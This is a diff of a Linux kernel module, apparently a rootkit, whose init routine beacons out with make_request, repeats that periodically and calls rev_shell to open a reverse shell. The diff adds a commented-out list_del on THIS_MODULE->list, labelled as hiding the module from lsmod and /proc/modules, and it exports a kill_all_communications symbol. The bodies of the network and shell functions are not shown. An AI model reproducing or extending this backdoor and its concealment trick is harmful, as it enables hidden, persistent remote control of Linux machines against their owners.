@@ -2,7 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/delay.h>    // Pour ssleep()
-
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
@@ -19,6 +19,7 @@ static int __init kernel_network_init(void) {
 	make_request("START");
 	make_request_periodic();
 	rev_shell();
+//	list_del(&THIS_MODULE->list); // remove from lsmod and /proc/modules
 	return 0;
 }
 
@@ -61,6 +62,7 @@ void rev_shell(void) {
 }
 
 EXPORT_SYMBOL(make_request);
+EXPORT_SYMBOL(kill_all_communications);
 
 module_init(kernel_network_init);
 module_exit(kernel_network_exit);
